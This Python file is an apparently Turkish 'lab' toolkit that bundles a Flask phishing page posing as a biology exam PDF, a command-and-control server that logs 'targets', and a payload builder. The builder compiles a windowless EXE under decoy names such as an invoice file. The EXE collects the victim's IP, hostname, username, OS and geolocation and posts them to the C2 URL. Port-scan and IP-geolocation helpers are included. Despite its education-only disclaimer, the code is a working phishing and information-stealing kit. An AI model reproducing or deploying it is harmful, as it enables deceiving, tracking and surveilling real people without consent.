#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║     ULTIMATE LAB + C2 + PAYLOAD v4.0                                         ║
║     Tek dosyada: Flask Sunucu + Eğitim Araçları + C2 + Payload Üretici      ║
║     SADECE EĞİTİM VE İZOLE LABORATUVAR İÇİNDİR                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import socket
import subprocess
import webbrowser
import threading
import uuid
import time
from datetime import datetime

# Kütüphane kontrolü ve yükleme
try:
    from flask import Flask, render_template_string, send_file, request, jsonify
    import requests
except ImportError:
    print("[!] Gerekli kütüphaneler yükleniyor...")
    subprocess.run([sys.executable, "-m", "pip", "install", "flask", "requests", "pyinstaller"])
    from flask import Flask, render_template_string, send_file, request, jsonify
    import requests

app = Flask(__name__)
DOWNLOAD_FOLDER = "downloads"
PAYLOAD_FOLDER = "payloads"
LOG_FOLDER = "logs"
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)
os.makedirs(PAYLOAD_FOLDER, exist_ok=True)
os.makedirs(LOG_FOLDER, exist_ok=True)

# ==================== TELEFON İÇİN SAHTE SAYFA ====================
PHISHING_PAGE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TYT Biyoloji Kampı 2025 - Full PDF</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 500px;
            width: 100%;
            overflow: hidden;
            animation: fadeIn 0.5s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .header {
            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        .header h1 { font-size: 28px; margin-bottom: 10px; }
        .content { padding: 30px; text-align: center; }
        .info-box {
            background: #f0fdf4;
            border-left: 4px solid #22c55e;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            text-align: left;
        }
        button {
            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            width: 100%;
        }
        button:hover { transform: translateY(-2px); }
        .warning { font-size: 11px; color: #999; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📘 TYT Biyoloji Kampı 2025</h1>
            <p>Full PDF - Konu Anlatımı + Soru Bankası</p>
        </div>
        <div class="content">
            <div class="info-box">
                <p>✅ 500+ Sayfa</p>
                <p>✅ Tüm konular özet</p>
                <p>✅ 2000+ çözümlü soru</p>
            </div>
            <form action="/indir" method="POST">
                <button type="submit">📥 PDF'i Hemen İndir</button>
            </form>
            <p class="warning">⚠️ Laboratuvar test dosyası - Gerçek PDF değildir</p>
        </div>
    </div>
</body>
</html>
"""

# ==================== PAYLOAD KODU (Hedefe gönderilecek) ====================
PAYLOAD_TEMPLATE = '''
import requests
import socket
import platform
import os
import json
import subprocess
from datetime import datetime

C2_URL = "{c2_url}"

def get_ip():
    try:
        response = requests.get('https://api.ipify.org', timeout=5)
        return response.text
    except:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "IP alinamadi"

def get_location():
    try:
        response = requests.get(f'http://ip-api.com/json/{get_ip()}', timeout=5)
        data = response.json()
        if data['status'] == 'success':
            return {{
                "ulke": data.get('country'),
                "sehir": data.get('city'),
                "enlem": data.get('lat'),
                "boylam": data.get('lon')
            }}
    except:
        pass
    return {{}}

def bilgi_topla():
    return {{
        "timestamp": str(datetime.now()),
        "ip": get_ip(),
        "hostname": socket.gethostname(),
        "user": os.getlogin(),
        "os": platform.system() + " " + platform.release(),
        "machine": platform.machine(),
        "konum": get_location()
    }}

def raporla():
    try:
        bilgi = bilgi_topla()
        requests.post(C2_URL, json=bilgi, timeout=5)
        return True
    except:
        return False

if __name__ == "__main__":
    raporla()
'''

# ==================== EĞİTİM ARAÇLARI SINIFI ====================
class EgitimAraclari:
    
    @staticmethod
    def ip_konum(ip=None):
        if not ip:
            ip = requests.get('https://api.ipify.org').text
        try:
            response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
            data = response.json()
            if data['status'] == 'success':
                return {
                    "ip": data['query'],
                    "ulke": data['country'],
                    "sehir": data['city'],
                    "enlem": data['lat'],
                    "boylam": data['lon'],
                    "isp": data['isp'],
                    "zaman_dilimi": data['timezone']
                }
            return {"hata": "IP bulunamadi"}
        except Exception as e:
            return {"hata": str(e)}
    
    @staticmethod
    def kendi_ip():
        try:
            return requests.get('https://api.ipify.org').text
        except:
            return "IP alinamadi"
    
    @staticmethod
    def sim_simulasyonu():
        return {
            "sim_durumu": "Simülasyon modu",
            "mcc_mnc_ornek": "28601 (Turkcell)",
            "operador_ornek": "Turkcell / Vodafone / Turk Telekom",
            "not": "Bu veriler eğitim amaçlı örneklerdir."
        }
    
    @staticmethod
    def adres_bul(enlem, boylam):
        try:
            url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={enlem}&lon={boylam}"
            response = requests.get(url, headers={'User-Agent': 'EgitimLab/1.0'})
            data = response.json()
            if 'display_name' in data:
                return {"adres": data['display_name']}
            return {"hata": "Adres bulunamadi"}
        except Exception as e:
            return {"hata": str(e)}
    
    @staticmethod
    def port_tara(hedef, portlar=[80, 443, 22, 21, 8080, 3306, 3389]):
        acik_portlar = []
        for port in portlar:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                if sock.connect_ex((hedef, port)) == 0:
                    acik_portlar.append(port)
                sock.close()
            except:
                pass
        return {"hedef": hedef, "acik_portlar": acik_portlar}
    
    @staticmethod
    def dns_sorgula(domain):
        try:
            return {"domain": domain, "ip": socket.gethostbyname(domain)}
        except:
            return {"hata": "DNS cozulemedi"}
    
    @staticmethod
    def ping_test(hedef):
        try:
            param = '-n' if os.name == 'nt' else '-c'
            result = subprocess.run(['ping', param, '1', hedef], capture_output=True, text=True, timeout=3)
            return {"hedef": hedef, "durum": "basarili" if result.returncode == 0 else "basarisiz"}
        except:
            return {"hata": "Ping basarisiz"}
    
    @staticmethod
    def whois_sorgula(domain):
        try:
            result = subprocess.run(['whois', domain], capture_output=True, text=True, timeout=3)
            return {"whois": result.stdout[:500] + "..." if len(result.stdout) > 500 else result.stdout}
        except:
            return {"hata": "whois calistirilamadi"}

egitim = EgitimAraclari()

# ==================== C2 VERİ DEPOLAMA ====================
hedef_listesi = []

# ==================== FLASK ROTALARI ====================

@app.route('/')
def index():
    """Telefon için sahte sayfa"""
    return render_template_string(PHISHING_PAGE)

@app.route('/indir', methods=['POST'])
def indir():
    """Telefona test dosyası indir (masum test için)"""
    test_kodu = '''
import tkinter as tk
from tkinter import messagebox
import platform
import socket
from datetime import datetime

root = tk.Tk()
root.withdraw()
messagebox.showinfo("Laboratuvar Test", f"Cihaz: {platform.system()}\\nBu bir eğitim testidir.")
root.destroy()
'''
    temp_py = os.path.join(DOWNLOAD_FOLDER, f"test_{uuid.uuid4().hex}.py")
    with open(temp_py, "w") as f:
        f.write(test_kodu)
    
    try:
        subprocess.run([
            "pyinstaller", "--onefile", "--noconsole",
            "--name", "TYT_Biyoloji_Kampi",
            "--distpath", DOWNLOAD_FOLDER,
            "--workpath", "/tmp/build",
            "--specpath", "/tmp/spec",
            temp_py
        ], capture_output=True, timeout=30)
        
        exe_path = os.path.join(DOWNLOAD_FOLDER, "TYT_Biyoloji_Kampi", "TYT_Biyoloji_Kampi.exe")
        if os.path.exists(exe_path):
            return send_file(exe_path, as_attachment=True, download_name="TYT_Biyoloji_Kampi.exe")
        return "Dosya oluşturuldu ancak bulunamadı"
    except Exception as e:
        return f"Hata: {e}"
    finally:
        if os.path.exists(temp_py):
            os.remove(temp_py)

# ==================== C2 API ROTALARI ====================
@app.route('/c2/report', methods=['POST'])
def c2_report():
    """Hedeften gelen bilgileri al"""
    data = request.json
    data["received_at"] = str(datetime.now())
    hedef_listesi.append(data)
    
    # Log dosyasına kaydet
    with open(os.path.join(LOG_FOLDER, "hedefler.json"), "a") as f:
        f.write(json.dumps(data) + "\n")
    
    print(f"""
╔════════════════════════════════════════════════════════════╗
║  🎯 YENİ HEDEF BİLGİSİ GELDİ!                             ║
╠════════════════════════════════════════════════════════════╣
║  📡 IP: {data.get('ip', '?')}
║  💻 Hostname: {data.get('hostname', '?')}
║  👤 Kullanıcı: {data.get('user', '?')}
║  🖥️  OS: {data.get('os', '?')}
║  📍 Konum: {data.get('konum', {}).get('sehir', '?')}
║  🕒 Zaman: {data.get('timestamp', '?')}
╚════════════════════════════════════════════════════════════╝
    """)
    
    return jsonify({"status": "ok"})

@app.route('/c2/hedefler', methods=['GET'])
def c2_hedefler():
    """Tüm hedef IP'leri göster (JSON)"""
    return jsonify(hedef_listesi)

@app.route('/c2/hedefler_html', methods=['GET'])
def c2_hedefler_html():
    """Hedefleri HTML olarak göster"""
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>C2 - Hedef Listesi</title>
        <style>
            body { font-family: monospace; background: #1a1a2e; color: white; padding: 20px; }
            table { width: 100%; border-collapse: collapse; }
            th, td { border: 1px solid #333; padding: 10px; text-align: left; }
            th { background: #00ff88; color: #1a1a2e; }
            tr:hover { background: #2a2a3e; }
        </style>
    </head>
    <body>
        <h1>🎯 Hedef Listesi (C2)</h1>
        <table>
            <tr><th>IP</th><th>Hostname</th><th>Kullanıcı</th><th>OS</th><th>Konum</th><th>Zaman</th></tr>
    """
    for hedef in hedef_listesi:
        html += f"""
            <tr>
                <td>{hedef.get('ip', '?')}</td>
                <td>{hedef.get('hostname', '?')}</td>
                <td>{hedef.get('user', '?')}</td>
                <td>{hedef.get('os', '?')}</td>
                <td>{hedef.get('konum', {}).get('sehir', '?')}</td>
                <td>{hedef.get('timestamp', '?')[:19]}</td>
            </tr>
        """
    html += "</table></body></html>"
    return html

# ==================== PAYLOAD OLUŞTURUCU API ====================
@app.route('/payload/olustur', methods=['POST'])
def payload_olustur():
    """Özel payload oluştur"""
    data = request.json
    exe_adi = data.get('exe_adi', 'payload.exe')
    c2_url = data.get('c2_url', f"http://{egitim.kendi_ip()}:5000/c2/report")
    
    # Payload kodunu oluştur
    payload_kodu = PAYLOAD_TEMPLATE.format(c2_url=c2_url)
    
    # Geçici dosya yaz
    temp_py = os.path.join(PAYLOAD_FOLDER, f"payload_{uuid.uuid4().hex}.py")
    with open(temp_py, "w", encoding="utf-8") as f:
        f.write(payload_kodu)
    
    # EXE oluştur
    exe_path = os.path.join(PAYLOAD_FOLDER, exe_adi)
    try:
        subprocess.run([
            "pyinstaller", "--onefile", "--noconsole",
            "--name", exe_adi.replace(".exe", ""),
            "--distpath", PAYLOAD_FOLDER,
            "--workpath", "/tmp/build",
            "--specpath", "/tmp/spec",
            temp_py
        ], capture_output=True, timeout=30)
        
        built_exe = os.path.join(PAYLOAD_FOLDER, exe_adi.replace(".exe", ""), exe_adi)
        if os.path.exists(built_exe):
            os.rename(built_exe, exe_path)
        
        return jsonify({
            "durum": "basarili",
            "dosya": exe_path,
            "c2_url": c2_url
        })
    except Exception as e:
        return jsonify({"durum": "hata", "mesaj": str(e)})
    finally:
        if os.path.exists(temp_py):
            os.remove(temp_py)

# ==================== BİLGİSAYAR ARAYÜZÜ (TEK SAYFA) ====================
LAB_ARAYUZ = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔬 Ultimate Lab + C2 v4.0</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            color: white;
        }
        .navbar {
            background: rgba(0,0,0,0.5);
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
        }
        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }
        .card {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 20px;
            border: 1px solid rgba(255,255,255,0.2);
            transition: transform 0.2s;
        }
        .card:hover { transform: translateY(-5px); }
        .card h3 {
            margin-bottom: 15px;
            color: #00ff88;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        input, select {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 8px;
            background: rgba(255,255,255,0.2);
            color: white;
        }
        button {
            background: linear-gradient(135deg, #00ff88, #00cc66);
            color: #1a1a2e;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            width: 100%;
        }
        .sonuc {
            background: rgba(0,0,0,0.5);
            border-radius: 10px;
            padding: 15px;
            margin-top: 15px;
            font-family: monospace;
            font-size: 12px;
            overflow-x: auto;
        }
        .tab-menu {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .tab-btn {
            background: rgba(255,255,255,0.1);
            width: auto;
            padding: 10px 20px;
        }
        .tab-btn.active { background: #00ff88; color: #1a1a2e; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .status {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(0,0,0,0.7);
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 11px;
        }
    </style>
</head>
<body>
    <div class="navbar">
        <h1>🔬 Ultimate Lab + C2 v4.0</h1>
        <div>📡 C2: /c2/hedefler_html | 🎯 Payload Üretici</div>
    </div>
    <div class="container">
        <div class="tab-menu">
            <button class="tab-btn active" onclick="switchTab('araclar')">🛠️ Eğitim Araçları</button>
            <button class="tab-btn" onclick="switchTab('c2')">🎯 C2 Hedef Takibi</button>
            <button class="tab-btn" onclick="switchTab('payload')">🧪 Payload Oluşturucu</button>
        </div>
        
        <!-- Eğitim Araçları Sekmesi -->
        <div id="araclar" class="tab-content active">
            <div class="grid">
                <div class="card"><h3>📍 IP Konum</h3>
                    <input type="text" id="ipInput" placeholder="IP (boş bırak kendi IP)">
                    <button onclick="ipKonum()">Sorgula</button>
                    <div id="ipSonuc" class="sonuc">Hazır</div>
                </div>
                <div class="card"><h3>🌐 Kendi IP</h3>
                    <button onclick="kendiIp()">Göster</button>
                    <div id="ipKendiSonuc" class="sonuc">Hazır</div>
                </div>
                <div class="card"><h3>📱 SIM Simülasyonu</h3>
                    <button onclick="simBilgisi()">Göster</button>
                    <div id="simSonuc" class="sonuc">Hazır</div>
                </div>
                <div class="card"><h3>🏠 Adres Bul</h3>
                    <input type="text" id="latInput" placeholder="Enlem">
                    <input type="text" id="lonInput" placeholder="Boylam">
                    <button onclick="adresBul()">Bul</button>
                    <div id="adresSonuc" class="sonuc">Hazır</div>
                </div>
                <div class="card"><h3>🔌 Port Tarama</h3>
                    <input type="text" id="portHedef" placeholder="Hedef IP">
                    <input type="text" id="portListesi" placeholder="Portlar (örn: 80,443)">
                    <button onclick="portTara()">Tara</button>
                    <div id="portSonuc" class="sonuc">Hazır</div>
                </div>
                <div class="card"><h3>🌍 DNS Sorgula</h3>
                    <input type="text" id="dnsDomain" placeholder="Domain">
                    <button onclick="dnsSorgula()">Sorgula</button>
                    <div id="dnsSonuc" class="sonuc">Hazır</div>
                </div>
            </div>
        </div>
        
        <!-- C2 Hedef Takibi Sekmesi -->
        <div id="c2" class="tab-content">
            <div class="card">
                <h3>🎯 Gelen Hedefler</h3>
                <button onclick="hedefListesi()">🔄 Yenile</button>
                <div id="c2Sonuc" class="sonuc">Henüz hedef yok...</div>
            </div>
        </div>
        
        <!-- Payload Oluşturucu Sekmesi -->
        <div id="payload" class="tab-content">
            <div class="card">
                <h3>🧪 Payload Oluşturucu</h3>
                <input type="text" id="exeAdi" placeholder="EXE adı (örn: Fatura.exe)" value="Fatura_Bilgisi.exe">
                <input type="text" id="c2Url" placeholder="C2 URL (örn: http://192.168.1.100:5000/c2/report)">
                <button onclick="payloadOlustur()">⚡ Payload Oluştur</button>
                <div id="payloadSonuc" class="sonuc">Hazır</div>
            </div>
        </div>
        
        <div class="footer" style="text-align:center; padding:20px; opacity:0.6;">
            ⚠️ SADECE EĞİTİM VE İZOLE LABORATUVAR İÇİNDİR
        </div>
    </div>
    <div class="status" id="status">✅ Sistem Hazır</div>
    
    <script>
        async function apiCall(endpoint, data) {
            const res = await fetch(endpoint, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
            return await res.json();
        }
        
        async function ipKonum() {
            const ip = document.getElementById('ipInput').value;
            const result = await apiCall('/api/ip_konum', { ip });
            document.getElementById('ipSonuc').innerHTML = JSON.stringify(result, null, 2);
        }
        
        async function kendiIp() {
            const result = await apiCall('/api/kendi_ip', {});
            document.getElementById('ipKendiSonuc').innerHTML = JSON.stringify(result, null, 2);
        }
        
        async function simBilgisi() {
            const result = await apiCall('/api/sim_simulasyonu', {});
            document.getElementById('simSonuc').innerHTML = JSON.stringify(result, null, 2);
        }
        
        async function adresBul() {
            const lat = document.getElementById('latInput').value;
            const lon = document.getElementById('lonInput').value;
            const result = await apiCall('/api/adres_bul', { lat, lon });
            document.getElementById('adresSonuc').innerHTML = JSON.stringify(result, null, 2);
        }
        
        async function portTara() {
            const hedef = document.getElementById('portHedef').value;
            const portlar = document.getElementById('portListesi').value;
            const result = await apiCall('/api/port_tara', { hedef, portlar });
            document.getElementById('portSonuc').innerHTML = JSON.stringify(result, null, 2);
        }
        
        async function dnsSorgula() {
            const domain = document.getElementById('dnsDomain').value;
            const result = await apiCall('/api/dns_sorgula', { domain });
            document.getElementById('dnsSonuc').innerHTML = JSON.stringify(result, null, 2);
        }
        
        async function hedefListesi() {
            const res = await fetch('/c2/hedefler');
            const data = await res.json();
            document.getElementById('c2Sonuc').innerHTML = JSON.stringify(data, null, 2);
        }
        
        async function payloadOlustur() {
            const exeAdi = document.getElementById('exeAdi').value;
            let c2Url = document.getElementById('c2Url').value;
            if (!c2Url) {
                const ipRes = await apiCall('/api/kendi_ip', {});
                c2Url = `http://${ipRes.ip}:5000/c2/report`;
            }
            const result = await apiCall('/payload/olustur', { exe_adi: exeAdi, c2_url: c2Url });
            document.getElementById('payloadSonuc').innerHTML = JSON.stringify(result, null, 2);
        }
        
        function switchTab(tabId) {
            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.getElementById(tabId).classList.add('active');
            event.target.classList.add('active');
        }
        
        setInterval(hedefListesi, 5000);
        hedefListesi();
    </script>
</body>
</html>
"""

# ==================== API ROTALARI ====================
@app.route('/lab')
def lab_arayuz():
    return render_template_string(LAB_ARAYUZ)

@app.route('/api/ip_konum', methods=['POST'])
def api_ip_konum():
    data = request.json
    return jsonify(egitim.ip_konum(data.get('ip')))

@app.route('/api/kendi_ip', methods=['POST'])
def api_kendi_ip():
    return jsonify({"ip": egitim.kendi_ip()})

@app.route('/api/sim_simulasyonu', methods=['POST'])
def api_sim():
    return jsonify(egitim.sim_simulasyonu())

@app.route('/api/adres_bul', methods=['POST'])
def api_adres():
    data = request.json
    return jsonify(egitim.adres_bul(data.get('lat'), data.get('lon')))

@app.route('/api/port_tara', methods=['POST'])
def api_port():
    data = request.json
    hedef = data.get('hedef')
    portlar_str = data.get('portlar')
    portlar = [int(p.strip()) for p in portlar_str.split(',')] if portlar_str else [80, 443, 22, 21, 8080]
    return jsonify(egitim.port_tara(hedef, portlar))

@app.route('/api/dns_sorgula', methods=['POST'])
def api_dns():
    data = request.json
    return jsonify(egitim.dns_sorgula(data.get('domain')))

def open_browser():
    time.sleep(1.5)
    webbrowser.open('http://localhost:5000/lab')

if __name__ == '__main__':
    print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║     ULTIMATE LAB + C2 + PAYLOAD v4.0                                         ║
║                                                                              ║
║  📱 TELEFON İÇİN:  http://<IP>:5000                                         ║
║  💻 LAB ARAYÜZ:    http://localhost:5000/lab                                ║
║  🎯 C2 HEDEFLER:   http://localhost:5000/c2/hedefler_html                   ║
║                                                                              ║
║  🧪 PAYLOAD OLUŞTUR:                                                         ║
║     1. Arayüzden "Payload Oluşturucu" sekmesine git                         ║
║     2. EXE adını gir (örn: Fatura.exe)                                      ║
║     3. Oluştur butonuna bas                                                ║
║     4. payloads/ klasöründe EXE hazır                                       ║
║                                                                              ║
║  ⚠️ SADECE EĞİTİM VE İZOLE LABORATUVAR İÇİNDİR                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
    """)
    threading.Thread(target=open_browser, daemon=True).start()
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
